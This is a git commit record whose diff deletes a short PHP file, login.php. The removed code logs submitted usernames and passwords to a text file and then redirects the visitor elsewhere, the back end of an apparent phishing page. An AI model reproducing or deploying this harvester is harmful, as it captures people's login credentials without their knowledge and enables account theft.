5d9773bf3f560760b688c3829faa15625ef518db
Carban2717 <165124910+Carban2717@users.noreply.github.com>
2024-09-02 15:10:42 +0300

    Delete login.php

--- login.php
+++
@@ -1,8 +0,0 @@
-<?php
-$file = fopen("credentials.txt", "a");
-fwrite($file, "Username: " . $_POST["username"] . "\n");
-fwrite($file, "Password: " . $_POST["password"] . "\n\n");
-fclose($file);
-header("Location: https://www.example.com");
-exit();
-?>
